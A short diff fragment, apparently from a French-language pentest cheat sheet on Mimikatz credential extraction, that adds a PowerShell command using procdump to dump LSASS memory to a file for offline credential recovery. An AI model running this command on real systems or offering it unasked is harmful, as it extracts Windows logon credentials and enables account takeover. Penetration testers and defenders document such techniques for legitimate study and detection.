@@ -20,6 +20,12 @@ sekurlsa::logonpasswords
 
 #### offline
 
+Récupération d'un dump avec prodcump
+
+``` powershell
+.\procdump64.exe -accepteula -ma lsass.exe c:\windows\tmp\lsass.dmp 
+```
+
 A partir d'un dump lsass.dmp
 
 ``` text
